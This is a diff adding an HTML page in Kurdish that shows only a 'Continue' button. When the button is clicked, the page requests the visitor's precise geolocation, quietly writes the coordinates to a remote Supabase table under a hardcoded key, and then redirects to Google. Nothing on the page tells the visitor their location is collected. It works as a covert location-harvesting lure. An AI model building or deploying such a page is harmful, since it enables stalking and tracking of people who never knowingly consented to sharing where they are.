@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Continue</title>
+  <style>
+    body {
+      background-color: #000000;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      text-align: center;
+    }
+    button {
+      background-color: #ffffff;
+      color: #000000;
+      border: none;
+      padding: 15px 35px;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: opacity 0.2s;
+    }
+    button:active {
+      opacity: 0.8;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #888888;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <button id="btn">بەردەوام بوون</button>
+    <div id="status"></div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
+
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    document.getElementById('btn').addEventListener('click', () => {
+      const status = document.getElementById('status');
+
+      if (!navigator.geolocation) {
+        status.innerText = "Geolocation is not supported.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          try {
+            await supabase.from('locations').insert([{
+              name: 'Visitor',
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            }]);
+            
+            // دوای تۆمارکردنی شوێنەکەی دەتوانیت ڕەوانەی ماڵپەڕێکی تری بکەیت (نموونە: Google)
+            window.location.href = "https://www.google.com";
+          } catch (err) {
+            console.error(err);
+          }
+        },
+        (err) => {
+          // ئەگەر ڕەزامەندی نەدا یان هەڵەیەک ڕووبدات
+          window.location.href = "https://www.google.com";
+        },
+        { enableHighAccuracy: true, timeout: 15000 }
+      );
+    });
+  </script>
+
+</body>
+</html>
